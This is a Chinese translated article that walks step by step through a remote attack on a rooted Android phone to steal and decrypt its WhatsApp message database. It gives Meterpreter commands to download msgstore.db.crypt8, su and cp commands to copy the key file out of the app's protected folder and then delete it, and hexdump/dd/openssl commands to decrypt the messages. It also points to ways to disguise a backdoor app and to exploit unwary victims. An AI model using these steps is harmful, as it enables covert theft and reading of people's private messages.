# 解密：攻击者如何逐步获取你的WhatsApp数据库

#### 译文声明
本文为翻译文章，原文来源于FREEBUF。译文仅供参考，具体内容和含义以原文为准。

![](http://image.3001.net/images/20151006/14441366194874.jpg!small)

本文详细介绍了针对已root的安卓设备进行远程攻击并解密WhatsApp数据库的过程。这再次提醒我们，对移动设备进行root（安卓）或越狱（iOS）会使其更容易遭受黑客攻击。

几小时前，网络上发布了一篇题为《如何远程破解并解密WhatsApp数据库[ROOT]》的文章，该文详细解释了从已root的安卓系统中提取并解密WhatsApp数据库的方法。尽管通常情况下WhatsApp非常安全，但对安卓设备进行root处理将使用户暴露于攻击风险之中。

接下来，我们将一步步解析作者（匿名[F.E.A.R.](http://creator.wonderhowto.com/feardie/)）所提出的攻击过程。

### 步骤1：利用漏洞并获取安卓设备的访问权限
正如[这篇指南](http://null-byte.wonderhowto.com/how-to/hack-android-using-kali-updated-and-faq-0164704/)所述，如果安卓设备通过Meterpreter命令进行了root，那么这一阶段将变得相对简单。
![](http://image.3001.net/images/20151006/14441368764056.jpg!small)
![](http://image.3001.net/images/20151006/14441368891790.jpg!small)

为了攻击并解密WhatsApp数据库，攻击者需要一个存储在数据文件夹中的密钥文件，而访问该文件的唯一途径是拥有root权限。此外，该密钥文件对于解密WhatsApp数据库至关重要。

### 步骤2：下载数据库
使用以下命令通过Meterpreter下载数据库：
```bash
cd /
cd /sdcard/WhatsApp
ls  # 列出当前目录内容
cd Databases
download msgstore.db.crypt8  # 下载msgstore.db.crypt8文件（可能需要较长时间）
```
![](http://image.3001.net/images/20151006/14441370227810.jpg!small)

### 步骤3：提取解密密钥
解密WhatsApp数据库所需的密钥文件中存储了两套解密密钥：实际的加密密钥K和一个名为IV的初始化向量。值得注意的是，WhatsApp密钥文件存储在一个安全的位置。以下是提取密钥文件的命令：
```bash
shell
su  # 获取超级用户权限
```

如F.E.A.R.所解释，这是整个过程中最困难的部分，特别是当目标手机用户是有经验且熟练的用户时，因为他们可能已经安装了[SuperSU](https://play.google.com/store/apps/details?id=eu.chainfire.supersu&hl=it)应用程序。

如何诱导受害者安装SuperSU？
可以参考用户[bart](http://creator.wonderhowto.com/bartvelp/)发布的[这篇教程](http://null-byte.wonderhowto.com/how-to/make-your-malicious-android-app-be-more-)，了解如何伪装一个后门应用程序。但如果受害者并非有经验或熟练的用户，则事情会变得更加简单：
1. 他们没有安装SuperSU应用程序。
2. 对于新安装的应用，他们没有将设置改为PROMPT，而是保持GRANT。

执行以下命令来访问密钥文件夹，并提取解密密钥：
```bash
cd /
cd /data/data
ls
cd com.whatsapp
ls
cd files
ls
cp key /sdcard/Download  # 将key文件复制到/sdcard/Download文件夹
```

### 步骤4：下载解密密钥文件到根目录
下载提取的密钥文件到根目录，该目录还包含加密的WhatsApp数据库：
```bash
cd /
cd /sdcard/Download
download key
rm key  # 确保删除key文件
```

### 步骤5：解密WhatsApp数据库
文章中提到了两种不同的方法来解密WhatsApp数据库：

**方法1：使用Linux命令**
每次复制并粘贴一条命令，不要将它们写成一个脚本文件，否则它将不能正常工作：
```bash
hexdump -e '2/1 "%02x"' key | cut -b 253-316 > aes.txt
hexdump -n 67 -e '2/1 "%02x"' msgstore.db.crypt8 | cut -b 103-134 > iv.txt
dd if=msgstore.db.crypt8 of=msgstore.db.crypt8.nohdr ibs=67 skip=1
openssl enc -aes-256-cbc -d -nosalt -nopad -bufsize 16384 -in msgstore.db.crypt8.nohdr -K $(cat aes.txt) -iv $(cat iv.txt) > msgstore.gz
gzip -cdq msgstore.gz > msgstore.db
```
如果第4行命令不能工作，请按以下指令操作：
```bash
hexdump -e '2/1 "%02x"' key | cut -b 253-316
hexdump -n 67 -e '2/1 "%02x"' msgstore.db.crypt8 | cut -b 103-134
openssl enc -aes-256-cbc -d -nosalt -nopad -bufsize 16384 -in msgstore.db.crypt8.nohdr -K (从第1条指令中粘贴文本) -iv (从第2条指令中粘贴文本) > msgstore.gz
```

**方法2：使用简单的Windows WhatsApp查看器应用程序**
请参阅[原文](http://null-byte.wonderhowto.com/how-to/hack-and-decrypt-whatsapp-database-remotely-root-0165015/)了解更多详情。

### 结论
这是一次重要的教训，对移动设备进行root（安卓）或越狱（iOS）会使用户更容易受到黑客攻击。